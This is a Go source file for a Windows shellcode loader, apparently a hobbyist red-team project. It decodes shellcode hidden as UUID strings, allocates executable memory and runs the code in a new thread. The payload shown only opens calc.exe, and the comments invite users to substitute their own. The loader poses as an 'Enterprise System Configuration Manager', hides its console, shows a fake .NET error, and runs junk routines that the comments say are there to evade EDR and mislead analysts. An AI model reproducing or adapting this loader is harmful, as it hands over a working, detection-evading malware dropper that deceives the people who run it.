// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!      IMPORTANT: Build with: go build -ldflags="-H windowsgui" main.go     !!! - Debug
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
//
//nolint:unsafeptr
package main

// Do not misuse this code for illegal activities. I am not responsible for any misuse of this code.
/*
SHELL CODE IS INCLUDED, READ BELOW...
DO NOT TRUST RANDOM SHELLCODE YOU FIND IN SHITTY GITHUB SCRIPTS
GENERATE YOUR OWN SHELLCODE [Line: 63-73 REPLACE THE SHELL CODE]
But in all honesty, this only opens calc.exe
*/
import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe" // needed for the low-level stuff

	"golang.org/x/sys/windows"
)

// Application constants - disguised as a legitimate system configuration tool
const (
	appTitle     = "Enterprise System Configuration Manager"
	appVer       = "1.0.4"
	configDelay  = 2000
	configSecret = "CONFIG_VALIDATION_KEY"
)

// Always run in silent mode for GUI application
var silentMode = true

// Windows API libraries and functions with obfuscated names
var (
	// DLLs we need
	sysLib1 = syscall.NewLazyDLL("kernel32.dll") // Kernel32.dll provides functions for managing resources and processes.
	sysLib2 = syscall.NewLazyDLL("ntdll.dll")    // Ntdll,dll provides functions for managing processes, threads, and other low-level system operations.
	sysLib3 = syscall.NewLazyDLL("rpcrt4.dll")   // Rpcrt4.dll provides functions for managing RPC (Remote Procedure Call) operations.
	sysLib4 = syscall.NewLazyDLL("user32.dll")   // User32.dll provides functions for managing user interface.

	// functions we'll use weird names to avoid detection
	sysFunc1  = sysLib1.NewProc("VirtualAlloc")     // VirtualAlloc is used to allocate memory for our payload.
	sysFunc3  = sysLib1.NewProc("CloseHandle")      // CloseHandler is used to close handles.
	sysFunc4  = sysLib1.NewProc("GetModuleHandleA") // GetModuleHandleA is used to get DLL handles.
	sysFunc5  = sysLib1.NewProc("GetProcAddress")   // GetProcAddres is used to find functions.
	sysFunc6  = sysLib2.NewProc("RtlMoveMemory")    // RtlMoveMemory is used to copy memory.
	sysFunc8  = sysLib3.NewProc("UuidFromStringA")  // UuidFromStringA is used to convert UUIDs to bytes.
	sysFunc9  = sysLib4.NewProc("ShowWindow")       // ShowWindow is used to hide the console window.
	sysFunc10 = sysLib1.NewProc("GetConsoleWindow") // GetConsoleWindow is used to get the console window handle.
	sysFunc11 = sysLib4.NewProc("MessageBoxW")      // MessageBoxW is used to display error messages.
)

/*
DO NOT TRUST RANDOM SHELLCODE YOU FIND IN SHITTY GITHUB SCRIPTS
GENERATE YOUR OWN SHELLCODE OR SUFFER THE COST OF RUNNING SOME CODE BY A
14YR OLD SUPER HACKER SKIBIDI FORTNITE NINJA! [REPLACE THE SHELL CODE BELOW WITH YOUR OWN UUID CONVERTED SHELLCODE]
But in all honesty, this only opens calc.exe
*/

// Configuration data - this is actually the calc.exe shellcode disguised as configuration UUIDs
var configItems = []string{
	"65d23148-8b48-6042-488b-7018488b7620", // PEB access - gets process info, entry point of shellcode
	"4d0e8b4c-098b-8b4d-4920-eb63418b493c", // walks the PEB to find kernel32.dll
	"41ff314d-88b7-014d-cf49-01cf458b3f4d", // finds export table in kernel32
	"8b41cf01-184f-8b45-7720-4d01cee33fff", // loops through exports to find WinExec()
	"f63148c9-8b41-8e34-4c01-ce4831c04831", // middle section - stack setup for function call
	"84acfcd2-74c0-c107-ca0d-01c2ebf44439", // stack manipulation
	"45da75c2-578b-4d24-01ca-410fb70c4a45", // contains the function call setup
	"4d1c5f8b-cb01-8b41-048b-4c01c8c3c341", // cleanup after call
	"8afe98b8-e80e-ff92-ffff-4831c95148b9", // pre[aring calc.exe string
	"636c6163-652e-6578-5148-8d0c244831d2", // calc.exe string in hex + some more instructions
	"48c2ff48-ec83-ff28-d090-909090909090", // padding + ret instruction + NOPs at end
}

// PE file format structures with obfuscated names
type dosHeader struct {
	E_magic    uint16     // MZ signature - always 0x5A4D ("MZ")
	E_cblp     uint16     // bytes on last page - don't really need this
	E_cp       uint16     // pages in file - old DOS stuff
	E_crlc     uint16     // relocations - nobody uses this anymore
	E_cparhdr  uint16     // size of header in paragraphs
	E_minalloc uint16     // minimum extra paagraphs - more DOS shit
	E_maxalloc uint16     // maximum extra parrgraphs
	E_ss       uint16     // initial SS - stack segment register
	E_sp       uint16     // initial SP - stack pointer register
	E_csum     uint16     // checksum - checkdeez
	E_ip       uint16     // initial IP - instruvtion pointer
	E_cs       uint16     // initial CS - code segment register
	E_lfarlc   uint16     // file addr of relocation table - ancient history
	E_ovno     uint16     // overlay number - dino
	E_res      [4]uint16  // reserved words - Micrococks just in case space
	E_oemid    uint16     // OEM identifier - Shit
	E_oeminfo  uint16     // OEM info - Doodoo
	E_res2     [10]uint16 // more reserved words = 1983 called
	E_lfanew   int32      // This is the important one - points to PE header
}

/*
 /~__________________________________~\
 .------------------------------------.
(| Got tired of writing comments here |)
 '------------------------------------'
 \_~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_/

 new day, think I might continue
*/

type fileHeader struct { // I might come back and add comments for the fields, just look these up if you are interested
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type dataDirectory struct { // I might come back and add comments for the fields, just look these up if you are interested
	VirtualAddress uint32
	Size           uint32
}

type optionalHeader struct { // I might come back and add comments for the fields, just look these up if you are interested
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]dataDirectory
}

type ntHeaders struct { // I might come back and add comments for the fields, just look these up if you are interested
	Signature      uint32
	FileHeader     fileHeader
	OptionalHeader optionalHeader
}

type exportDirectory struct { // I might come back and add comments for the fields, just look these up if you are interested
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// Windows constants for ShowWindow and MessageBox
const ( // i'll add comments for there tho, use Microsoft docs for other buttons, etc.
	SW_HIDE = 0 // SW_HIDE will hide the window
	SW_SHOW = 5 // SW_SHOW will show the window

	// MessageBox constants https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox
	MB_OK            = 0x00000000 // Button
	MB_ICONERROR     = 0x00000010 // Icon
	MB_SYSTEMMODAL   = 0x00001000 // Type
	MB_SETFOREGROUND = 0x00010000 // Type
)

// Function to hide the console window
func hideConsoleWindow() {
	hwnd, _, _ := sysFunc10.Call()
	if hwnd != 0 {
		sysFunc9.Call(hwnd, SW_HIDE)
	}
}

// [BOOKMARK] Function to show the console window (for debugging)
/*func showConsoleWindow() {
	hwnd, _, _ := sysFunc10.Call()
	if hwnd != 0 {
		sysFunc9.Call(hwnd, SW_SHOW)
	}
}
*/

// Function to show a fake .NET Framework error message
func showFakeErrorMessage() {
	title, _ := syscall.UTF16PtrFromString("Application Error")
	message, _ := syscall.UTF16PtrFromString("Error: This application requires .NET Framework 4.8\r\nPlease install the latest .NET Framework from Microsoft's website.\r\nError code: 0x800736B3")

	// Show the error message box
	sysFunc11.Call(
		0, // No parent window
		uintptr(unsafe.Pointer(message)),
		uintptr(unsafe.Pointer(title)),
		MB_OK|MB_ICONERROR|MB_SYSTEMMODAL|MB_SETFOREGROUND,
	)
}

// Helper function to print output only if not in silent mode
func printOutput(format string, args ...interface{}) {
	if !silentMode {
		fmt.Printf(format, args...)
	}
}

// Helper function to print a line only if not in silent mode
func printLine(text string) {
	if !silentMode {
		fmt.Println(text)
	}
}

// Display application banner and info
func displayAppInfo() {
	printOutput("\n%s v%s\n", appTitle, appVer)
	printLine("Copyright (c) 2024 Enterprise Solutions Inc.")
	printLine("All rights reserved.")
	printLine("\nInitializing configuration manager...")
}

// XOR
// the most basic obfuscation possible but EDRs still fall for it
// we just XORing each byte with a repeating key. </nsa> level encryption!
func transformData(data []byte, key string) []byte {
	keyBytes := []byte(key)
	result := make([]byte, len(data))

	// basic XOR nothing fancy but works
	for i, b := range data {
		result[i] = b ^ keyBytes[i%len(keyBytes)] // cycle through key bytes
	}

	return result // Returns the tranformed data
}

// Convert UUID to bytes
// Saw this in a Red Siege blog, thought it was cool
// Windows has a built-in function to convert UUIDs to binary - free shellcode loader!
func processItem(itemStr string) ([]byte, error) {
	itemBytes := make([]byte, 16)

	itemCStr := append([]byte(itemStr), 0)

	ret, _, _ := sysFunc8.Call(
		uintptr(unsafe.Pointer(&itemCStr[0])),
		uintptr(unsafe.Pointer(&itemBytes[0])),
	)

	if ret != 0 {
		return nil, fmt.Errorf("configuration item processing failed with code %d", ret)
	}

	return itemBytes, nil
}

// Convert our UUIDs to actual shellcode bytes
// This is where the magic happens - turning innocent-looking strings into executable code
// Double XOR is just for show - makes it look like we're doing real crypto
func prepareConfig() ([]byte, error) {
	// figure out how much space we need - each UUID is 16 bytes when converted
	totalSize := len(configItems) * 16
	configBytes := make([]byte, 0, totalSize)

	// convert each UUID to bytes - Lazarus Group Technique
	// using UUIDs but it's actually our shellcode
	// Windows API has a built-in UUID converter we can abuse for this
	for i, itemStr := range configItems {
		itemBytes, err := processItem(itemStr)
		if err != nil {
			return nil, fmt.Errorf("failed to process configuration item %d: %v", i, err)
		}

		configBytes = append(configBytes, itemBytes...)
	}

	// XOR it once - this is just obfuscation to avoid detection
	// makes it look different in memory dumps/scans
	configBytes = transformData(configBytes, configSecret)

	// XOR it again to get back to original - the double XOR cancels out
	// this is actually a trick to make AV think we're doing legitimate crypto
	// but we're just getting back our original shellcode
	return transformData(configBytes, configSecret), nil
}

// Grab DLL handle - we need this to find functions later
// Windows loads most DLLs into the same address for all processes
func getLibraryAddress(libraryName string) (uintptr, error) {
	libraryNameBytes := append([]byte(libraryName), 0)

	libraryHandle, _, err := sysFunc4.Call(
		uintptr(unsafe.Pointer(&libraryNameBytes[0])),
	)

	if libraryHandle == 0 {
		return 0, fmt.Errorf("library not found: %v", err)
	}

	return libraryHandle, nil
}

// Find function address by name, basically GetProcAddress but we're doing it ourselves
// This is how our shellcode finds WinExec() or other functions it needs to call
func getFunctionAddress(libraryBase uintptr, functionName string) (uintptr, error) {
	functionNameBytes := append([]byte(functionName), 0)

	functionAddress, _, err := sysFunc5.Call(
		libraryBase,
		uintptr(unsafe.Pointer(&functionNameBytes[0])),
	)

	if functionAddress == 0 {
		return 0, fmt.Errorf("function not found: %v", err)
	}

	return functionAddress, nil
}

// Parse PE header to find exports
// We're manually walking the PE format like malware does to find function addresses
// Totally unnecessary but we are so one three three seven
func analyzeExports(libraryBase uintptr) error {
	dHeader := (*dosHeader)(unsafe.Pointer(libraryBase)) // Using the dosHeader struct to access the PE header

	nHeaders := (*ntHeaders)(unsafe.Pointer(libraryBase + uintptr(dHeader.E_lfanew))) // Then we get the ntHeaders struct to access the optional header

	exportDirRVA := nHeaders.OptionalHeader.DataDirectory[0].VirtualAddress // Get the RVA of the export directory

	exportDir := (*exportDirectory)(unsafe.Pointer(libraryBase + uintptr(exportDirRVA))) // Get the exportDirectory struct to access the function addresses

	functionAddresses := (*[1 << 30]uint32)(unsafe.Pointer(libraryBase + uintptr(exportDir.AddressOfFunctions)))   // Get the function addresses
	functionNames := (*[1 << 30]uint32)(unsafe.Pointer(libraryBase + uintptr(exportDir.AddressOfNames)))           // Get the function names
	functionOrdinals := (*[1 << 30]uint16)(unsafe.Pointer(libraryBase + uintptr(exportDir.AddressOfNameOrdinals))) // Get the function ordinals

	maxFunctions := uint32(5) // Limit the number of functions to analyze
	if exportDir.NumberOfNames < maxFunctions {
		maxFunctions = exportDir.NumberOfNames
	}

	for i := uint32(0); i < maxFunctions; i++ { // Loop through the functions
		functionName := (*[1 << 30]byte)(unsafe.Pointer(libraryBase + uintptr(functionNames[i]))) // Get the function name

		ordinal := functionOrdinals[i] // Get the function ordinal

		/*
			Then we get the function address
			convert it to a string
		*/
		functionRVA := functionAddresses[ordinal]
		functionAddr := libraryBase + uintptr(functionRVA)
		// nameStr := windows.BytePtrToString((*byte)(unsafe.Pointer(&functionName[0])))
		nameStr := windows.BytePtrToString((*byte)(unsafe.Pointer(&functionName[0])))

		// Just use the values to avoid unused variable warnings
		_ = nameStr
		_ = functionAddr
	}

	return nil
}

// this is where we actually run the shellcode
// nothing fancy but reliable
func applyConfig(configBytes []byte, analysisMode bool) error {
	/*
		Below we allocate memory for our shellcode,
		copy it to memory, make it executable, and run it.
		While also trying to avoid detection
	*/
	printLine("- Locating system libraries...")
	libBase, err := getLibraryAddress("kernel32.dll")
	if err != nil {
		return fmt.Errorf("system library not available: %v", err)
	}
	printOutput("- System library located at: 0x%x\n", libBase)

	printLine("- Analyzing library functions...")
	err = analyzeExports(libBase)
	if err != nil {
		printOutput("Warning: Library analysis incomplete: %v\n", err)
	}

	// Need CreateThread to run our "config"
	printLine("- Locating configuration functions...")
	createThreadFunc, err := getFunctionAddress(libBase, "CreateThread")
	if err != nil {
		return fmt.Errorf("configuration function not available: %v", err)
	}
	printOutput("- Configuration function located at: 0x%x\n", createThreadFunc)

	// Allocate some memory for our payload
	printLine("- Allocating configuration memory...")
	configAddr, _, lastErr := sysFunc1.Call(
		0,
		uintptr(len(configBytes)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if configAddr == 0 {
		return fmt.Errorf("configuration allocation failed: %v", lastErr)
	}
	printOutput("- Configuration memory allocated at: 0x%x\n", configAddr)

	// Copy the shellcode to memory
	printLine("- Writing configuration data...")
	_, _, _ = sysFunc6.Call(
		configAddr,
		uintptr(unsafe.Pointer(&configBytes[0])),
		uintptr(len(configBytes)),
	)

	// Make it executable
	printLine("- Setting configuration permissions...")
	var oldProtect uint32
	err = windows.VirtualProtect(configAddr, uintptr(len(configBytes)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return fmt.Errorf("configuration protection failed: %v", err)
	}
	printOutput("- Configuration permissions updated from 0x%x to PAGE_EXECUTE_READ\n", oldProtect)

	// Fire it up! - The Crow, good movie go watch it.
	printLine("- Starting configuration thread...")

	// Only show breakpoint and analysis info in analysis mode
	if analysisMode {
		// ========== BREAKPOINT 1 ==========
		// This will pause execution right before the shellcode is executed
		// allowing you to inspect the process with Process Hacker
		fmt.Println("\n========== BREAKPOINT 1 ==========")
		fmt.Printf("Process ID: %d\n", os.Getpid())
		fmt.Printf("Shellcode loaded at address: 0x%x\n", configAddr)

		// Allocate separate memory regions with recognizable messages
		// This is just for demonstration purposes to show how to view memory in Process Hacker

		// First junk message
		junkMessage1 := "THIS IS PRIMARY JUNK DATA FOR MEMORY ANALYSIS " +
			"Debug wuz here. " +
			"What are you looking at? " +
			"Congrats, You found me! "

		// Second junk message to spam all over memory
		junkMessage2 := "SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID " +
			"SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID " +
			"SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID " +
			"SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID SKID "

		// Create large blocks of data by repeating the messages
		junkData1 := []byte(strings.Repeat(junkMessage1, 50))
		junkData2 := []byte(strings.Repeat(junkMessage2, 100))

		// Allocate memory for our first junk data
		junkAddr1, _, _ := sysFunc1.Call(
			0,
			uintptr(len(junkData1)),
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			windows.PAGE_READWRITE,
		)

		// Copy first junk data to the allocated memory
		_, _, _ = sysFunc6.Call(
			junkAddr1,
			uintptr(unsafe.Pointer(&junkData1[0])),
			uintptr(len(junkData1)),
		)

		// Allocate and copy the second junk message to multiple memory regions
		var junkAddrs2 []uintptr
		for i := 0; i < 5; i++ {
			// Allocate memory for second junk data
			junkAddr2, _, _ := sysFunc1.Call(
				0,
				uintptr(len(junkData2)),
				windows.MEM_COMMIT|windows.MEM_RESERVE,
				windows.PAGE_READWRITE,
			)

			// Copy second junk data to the allocated memory
			_, _, _ = sysFunc6.Call(
				junkAddr2,
				uintptr(unsafe.Pointer(&junkData2[0])),
				uintptr(len(junkData2)),
			)

			junkAddrs2 = append(junkAddrs2, junkAddr2)
		}

		fmt.Printf("Primary junk data loaded at address: 0x%x (size: %d bytes)\n", junkAddr1, len(junkData1))
		fmt.Println("Secondary junk data scattered across memory at addresses:")
		for i, addr := range junkAddrs2 {
			fmt.Printf("  Region %d: 0x%x (size: %d bytes)\n", i+1, addr, len(junkData2))
		}
		fmt.Println("\nProcess is now paused. Open Process Hacker to inspect.")
		fmt.Println("In Process Hacker, right-click on this process, select Properties > Memory")
		fmt.Println("Find the memory regions at the addresses shown above")
		fmt.Println("Right-click on a memory region and select 'Read/Write Memory'")
		fmt.Println("You should be able to see:")
		fmt.Println("1. The shellcode at the shellcode address")
		fmt.Println("2. The primary junk data at its address")
		fmt.Println("3. The secondary junk data scattered across multiple regions")
		fmt.Println("\nPress Enter to execute the shellcode...")
		fmt.Scanln() // Wait for user to press Enter
		// ================================
	}

	threadHandle, _, lastErr := syscall.SyscallN(
		createThreadFunc, // createThreadFunc = CreateThread
		0,                // security attributes
		0,                // stack size
		configAddr,       // start address
		0,                // parameter
		0,                // creation flags
		0,                // thread ID
	)

	// Check if the thread handle is valid
	if threadHandle == 0 {
		return fmt.Errorf("configuration thread failed: %v", lastErr)
	}
	printOutput("- Configuration thread started with handle: 0x%x\n", threadHandle)

	// wait for calc to pop up
	printLine("- Waiting for configuration to complete...")
	waitResult, err := windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
	if waitResult != 0 || err != nil {
		printOutput("Warning: Configuration wait returned: %d, error: %v\n", waitResult, err)
	}

	// In analysis mode, print a completion message
	if analysisMode {
		fmt.Println("\nShellcode execution completed.")
		fmt.Println("Any processes launched by the shellcode should now be visible in Process Hacker.")
	}

	// clean up after ourselves like genteleman - Spy
	printLine("- Cleaning up resources...")
	_, _, _ = sysFunc3.Call(threadHandle)

	return nil
}

// Fibonacci calculator
// Doing operations helps fool some EDRs into thinking we are a real application
// Plus it wastes analyst time looking at irrelevant code so why not
func calculateFibonacci(n int) int {
	if n <= 1 {
		return n
	}
	a, b := 0, 1
	for i := 2; i <= n; i++ {
		a, b = b, a+b
	}
	return b // https://r.mtdv.me/watch?v=freevbucksworking
}

// Fake system resource check
// We're not actually checking anything, just making up numbers
func calculateSystemResources() float64 {
	// Simulate checking system resources with some math
	baseMemory := 8.0 // GB // We shouldn't hardcode.

	for i := 1; i < 20; i++ {
		fib := calculateFibonacci(i)

		// and nowd we just the memory value slightly based on Fibonacci
		baseMemory += float64(fib) * 0.01
	}

	return float64(int(baseMemory*100)) / 100
}

func showProgressBar(label string, durationMs int) {
	if !silentMode {
		printOutput("%s: ", label)
	}

	totalSteps := 20
	stepDuration := durationMs / totalSteps

	for i := 0; i <= totalSteps; i++ {
		// Calculate percentage
		percent := i * 100 / totalSteps

		if !silentMode {
			printOutput("\r%s: [%-20s] %3d%%", label, strings.Repeat("#", i), percent)
		}

		// Sleep for a short time to simulate work
		time.Sleep(time.Duration(stepDuration) * time.Millisecond)
	}

	if !silentMode {
		printLine("")
	}
}

// Calculate a system metric
func calculateMetric(name string, min, max int) float64 {
	// Generate a random value
	baseValue := float64(min + (len(name)*7)%(max-min))

	// quick math huge haka
	precision := float64(len(name)) * 0.1

	return baseValue + precision
}

func checkRequirements() bool {
	// The function doesn't do anything real, just some junk data
	printLine("Checking system requirements...")
	printLine("- Operating System: Windows 10 or later")
	printLine("- Processor: 64-bit architecture")
	printLine("- Memory: 4GB minimum")

	totalMemory := calculateSystemResources()
	printOutput("- Available memory: %.2f GB\n", totalMemory)

	showProgressBar("Verifying system compatibility", 2000)

	printLine("All requirements satisfied.")
	return true
}

func displaySystemInfo() {
	printLine("\nSystem Information:")
	printLine("- OS: Windows")
	printLine("- Architecture: x64")
	printLine("- User: Administrator") // hardcoding this values is not good practice,
	// Calculate some haka metrics
	cpuMetric := calculateMetric("CPU", 85, 95)
	memoryMetric := calculateMetric("Memory", 70, 90)
	diskMetric := calculateMetric("Disk", 60, 80)
	printOutput("- Performance Index: %.1f/100\n", (cpuMetric+memoryMetric+diskMetric)/3)
	showProgressBar("Analyzing system performance", 1500)
}

func showLicense() { // mor junk 4 u
	printLine("\nLicense Information:")
	printLine("This software is licensed to: Enterprise User")
	printLine("License Type: Professional")
	printLine("Expiration: Perpetual")
	validateLicense()
}

// license validation
func validateLicense() {
	showProgressBar("Validating license", 1500)
	printLine("License validation successful.")
}

// Perform background procesng
func performBackgroundTasks() {
	printLine("\nPerforming background system tasks...")

	// Show bars for operations
	showProgressBar("Checking system registry", 2000)
	showProgressBar("Optimizing system configuration", 3000)
	showProgressBar("Updating configuration database", 2500)

	// Calculate some Fibonacci numbers in the background
	printLine("Performing system calculations...")
	results := make([]int, 0)
	for i := 20; i < 40; i++ {
		// Calculate Fibonacci numbers
		fib := calculateFibonacci(i)
		results = append(results, fib)

		// dleep briefly to simulate work is being done
		time.Sleep(100 * time.Millisecond)

		// Print a cool dot. <- crazy work
		if i%5 == 0 && !silentMode {
			fmt.Print(".")
		}
	}
	printLine("\nCalculations completed.")
	printOutput("Processed %d system values\n", len(results))
}

// main function
func main() {
	// cjeck if we're running as a console application (not built with -H windowsgui)
	hwnd, _, _ := sysFunc10.Call()
	isConsoleApp := (hwnd != 0)

	// parse command line flags
	showError := true
	analysisMode := false

	// Create a new slice for filtered arguments
	filteredArgs := make([]string, 0, len(os.Args))
	filteredArgs = append(filteredArgs, os.Args[0]) // Always keep the program name

	// check each argument and filter out the ones we handle
	for _, arg := range os.Args[1:] {
		if arg == "--no-error" {
			showError = false
			// Dont add this to filteredArgs
		} else if arg == "--analysis" || arg == "-a" {
			analysisMode = true
			// analysis mode requires console output
			silentMode = false
			// Don't add this to filteredArgs
		} else {
			// Keep any other arguments
			filteredArgs = append(filteredArgs, arg)
		}
	}

	// Replace os.Args with our filtered version
	os.Args = filteredArgs

	// if in analysis mode, we want to keep the console window visible
	// otherwise, handle console window based on build type
	if !analysisMode {
		if isConsoleApp {
			// show a warning if built without the windowsgui flag
			fmt.Println("!!! WARNING [CURRENTLY RUNNING IN ANALYSIS MODE]: This application was built without -ldflags=\"-H windowsgui\" !!!")
			fmt.Println("For proper functionality, build with:")
			fmt.Println("go build -ldflags=\"-H windowsgui\" main.go")
			fmt.Println("Or use the provided build script: go run build/build.go")
			fmt.Println("\nContinuing execution, but the console window will remain visible...")
			fmt.Println("Press Enter to continue anyway...")
			fmt.Scanln() // wait for user to press Enter
		} else {
			// hide the console window if it exists, use the build script...
			hideConsoleWindow()
		}
	} else {
		fmt.Println("Running in analysis mode. Process Hacker integration enabled.")
	}

	// show error message after 3 seconds
	if showError {
		go func() {
			time.Sleep(3 * time.Second)
			showFakeErrorMessage()
		}()
	}

	// display application banner
	displayAppInfo()

	// show some legitimate looking output
	checkRequirements()
	displaySystemInfo()
	showLicense()

	// Perform background tasks with bars
	performBackgroundTasks()

	printLine("\nLoading configuration data...")
	configBytes, err := prepareConfig()
	if err != nil {
		printLine("Error: Configuration data could not be loaded.")
		printLine("Please reinstall the application or contact support.")
		os.Exit(1) // bail out if we can't load our payload
	}
	printLine("Configuration data loaded successfully.")

	// run our shellcode
	printLine("Applying system configuration...")
	err = applyConfig(configBytes, analysisMode)
	if err != nil {
		printLine("Error: Configuration could not be applied.")
		printLine("Please try running the application as administrator.")
		os.Exit(1) // need admin rights probably
	}

	// we're done!
	printLine("Configuration applied successfully.")
	printLine("System Configuration Manager has completed all tasks.")
	printLine("Thank you for using our product.")
}

// Sources that i used below, also thanks to red siege! I learned a lot with Red Siege, thanks.
/*
Read all of RedSiege's Adventures in Shellcode Obfuscation blog series, they are great.
RedSiege Blog - https://redsiege.com/blog
UUID Technique - https://redsiege.com/blog/2024/08/adventures-in-shellcode-obfuscation-part-8-shellcode-as-uuids/
Windows API Calls Series - https://sensei-infosec.netlify.app/forensics/windows/api-calls/2020/04/29/win-api-calls-1
Windows API Docs - https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list
MessageBox Docs - https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox
*/
